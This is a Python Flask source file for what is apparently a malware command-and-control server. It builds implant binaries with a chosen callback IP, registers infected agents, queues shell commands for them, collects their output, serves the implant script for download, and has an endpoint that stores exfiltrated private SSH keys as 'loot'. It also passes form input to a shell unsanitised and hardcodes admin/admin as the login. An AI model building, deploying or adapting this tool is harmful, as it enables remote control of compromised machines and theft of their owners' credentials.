from flask import render_template, redirect, url_for, request, session, flash
from flask import abort, send_from_directory
from flask_wtf import FlaskForm
from functools import wraps
from models import app, Agent, db, Commands
from wtforms import StringField

import os
import subprocess


def login_required(f):
    """Requires a user to login before they can access critical endpoints

    :returns: redirects an unauthenticated user to /login
    :rtype: wrap
    """
    @wraps(f)
    def wrap(*args, **kwargs):
        if 'logged_in' in session:
            return f(*args, **kwargs)
        else:
            flash('You need to login first.')
            return redirect(url_for('login'))

    return wrap


class MyForm(FlaskForm):
    """Form used to configure the main implant

    :param ip: The callback IP address
    :type ip: str
    :param sleep: The amount of the time the implant should wait to callback
    :type sleep: str
    :returns: none
    :rtype: None
    """
    ip = StringField('IP')
    sleep = StringField('Sleep Time')


def build_implant(ip="127.0.0.1", sleepTime="0"):
    """Builds the binary using the user provided config values

    :param ip: The callback IP address, defaulted at localhost
    :type ip: str
    :param sleepTime: The amount of time the implant should wait to callback
    :type sleepTime: str
    :returns: none
    :rtype: None
    """
    subprocess.Popen(
                    [f"../implant/payloads/make.sh -h {ip} -s {sleepTime}"],
                    shell=True
    )


def add_agent(agent_dict):
    """Adds an agent to the backend database

    :param agent_dict: A dictionary containing all the agent information
    :type agent_dict: dict
    :returns: the ID of the new agent
    :rtype: int
    """
    # if not db.session.query(db.exists().where(Agent.ip == agent_dict['IP'])
    # ).scalar():
    args = [str(agent_dict['Stats'][key]) for key in agent_dict['Stats']]
    args += [str(agent_dict['total'])]
    args += [agent_dict['IP']]
    agent = Agent(*args)
    db.session.add(agent)
    db.session.flush()
    agent_id = agent.id
    print(agent_id)
    db.session.commit()
    print(agent_id)
    os.mkdir(f"loot/agent_{agent_id}")
    return agent.id


@app.route('/config', methods=['GET', 'POST'])
@login_required
def generate():
    """Endpoint that contains a form allowing the user to provide values
    for a custom config and generate a new implant binary

    """
    form = MyForm()
    if request.method == 'POST':
        args = [request.form[key] for key in request.form.keys()
                if request.form[key] != '']
        print(args)
        build_implant(*args)
        print("Payload Successfuly Generated!")
    return render_template("config.html", form=form)


@app.route('/bots', methods=['GET'])
@login_required
def bots():
    return render_template("bots.html")


@app.route('/bot<id>', methods=['GET'])
@login_required
def bot(id):
    """Endpoint that displays all the information regarding the
    bot with the specified ID, and includes an interactive shell.

    :param id: The ID of the agent
    :type id: str
    """
    agent = Agent.query.filter_by(id=id).first()
    print(agent)
    return render_template("bot.html", agent=agent)


@app.route('/', methods=['GET', 'POST'])
@login_required
def home():
    output = ""
    if request.method == "POST":
        command = request.form['command']
        implantID = request.form['id']
        db.session.add(Commands(implantID=implantID, command=command))
        db.session.flush()
        db.session.commit()
        res = Commands.query.filter_by(implantID=implantID).first()
        res.command = command
        db.session.commit()
        res = Commands.query.filter_by(implantID=implantID).first()
        output = res.output

    agents = db.session.query(Agent).all()
    return render_template('index.html', agents=agents, command_out=output)


@app.route('/api/1.1/add_command', methods=['POST'])
def add_command():
    """API endpoint that allows the bot terminal to add
    commands to the Command table in the database

    :returns: a json RPC object containing any finished jobs and the new job ID
    :rtype: dict
    """
    if request.method == 'POST':
        json = request.json
        if json is None:
            return "Bad request"
        command = json['params']
        implantID = json['method'][4:]
        new_comm = Commands(implantID=implantID, command=command)
        db.session.add(new_comm)
        db.session.flush()
        db.session.commit()
        db.session.refresh(new_comm)
        res = Commands.query.filter(
                                    Commands.implantID == implantID,
                                    Commands.retrieved is True,
                                    Commands.displayed is False
                                    ).first()
        output = f"[+] new job started with id {new_comm.commandID}"
        if res is not None and res.output is not None:
            res.displayed = True
            output += f"\n[*] job with id {res.commandID} \
                        finished with output: \n{res.output}"
            db.session.flush()
            db.session.commit()
        rpc = {}
        rpc["result"] = output
        rpc["jsonrpc"] = json["jsonrpc"]
        rpc["id"] = json["id"]
        return rpc


@app.route('/api/1.1/add_agent', methods=['POST'])
def agent_add():
    """API endpoint that allows an implant to register
    itself to the server

    :returns: the new agent ID
    :rtype: str
    """
    if request.method == 'POST':
        agent_dict = request.json
        id = add_agent(agent_dict)
        return str(id)


@app.route('/api/1.1/get_command', methods=['POST'])
def get_command():
    """API endpoint that allows an implant to fetch
    commands from the server

    :returns: none if there are no commands to retrieve,
    else the command and it's ID
    :rtype: str
    """
    if request.method == 'POST':
        json = request.json
        if json is None:
            return "Bad request"
        agent_id = json['id']
        res = Commands.query.filter(
                                    Commands.implantID == agent_id,
                                    Commands.retrieved is False
                                    ).first()
        if res is None:
            return "None"
        res.retrieved = True
        db.session.flush()
        db.session.commit()
        return res.command + "," + str(res.commandID)


@app.route('/api/1.1/command_out', methods=['POST'])
def command_out():
    """API endpoint that allows an implant to send
    output of commands back to the server

    :returns: status to the agent of whether it received the output
    :rtype: str
    """
    print(request.method)
    if request.method == 'POST':
        json = request.json
        if json is None:
            return "Bad request"
        output = json['output']
        implantID = json['implantID']
        commandID = json['commandID']
        command = Commands.query.filter(
                                    Commands.implantID == implantID,
                                    Commands.commandID == commandID
                                    ).first()
        command.output = output
        db.session.flush()
        db.session.commit()
        return 'Received'


@app.route('/api/1.1/ssh_keys', methods=['POST'])
def ssh_keys():
    """API endpoint that allows an agent to send back exfiltrated
    private ssh keys

    :returns: status to the agent of whether it received the keys
    :rtype: str
    """
    if request.method == 'POST':
        json = request.json
        if json is None:
            return "Bad request"
        key_dict = json['keys']
        agent_id = json['id']
        with open(f"loot/agent_{agent_id}/ssh_keys.txt", 'a+') as file:
            for key in key_dict:
                file.write(f"{key}: {key_dict[key]}\n")
        return 'Received BINGUS MODE'


@app.route('/api/1.1/retrieve_scripts', methods=['GET'])
def scripts():
    """API endpoint that allows an agent to retrieve scripts
    from the server

    :returns: files that the agent requested
    :rtype: file
    """
    try:
        return send_from_directory('implant',
                                   path='implant.py',
                                   filename='implant.py',
                                   as_attachment=True)
    except FileNotFoundError:
        abort(404)


@app.route('/welcome', methods=['GET'])
def welcome():
    return render_template("welcome.html")


@app.route('/login', methods=['GET', 'POST'])
def login():
    """Endpoint that allows a user to login and authenticate
    themselves with the server

    """
    error = None
    if request.method == 'POST':
        if request.form['username'] != 'admin' or \
           request.form['password'] != 'admin':
            error = "Invalid credentials. Please try again."
        else:
            session['logged_in'] = True
            flash('You were just logged in!')
            return redirect(url_for('home'))
    return render_template('login.html', error=error)


@app.route('/logout', methods=['GET'])
@login_required
def logout():
    """Endpoint that allows a user to logout of their session

    """
    session.pop('logged_in', None)
    flash('You were just logged out!')
    return redirect(url_for('welcome'))


if __name__ == '__main__':
    """Runs the base flask app, only use for debugging,
    otherwise use the preferred method in README.md

    """
    app.run(host="0.0.0.0")
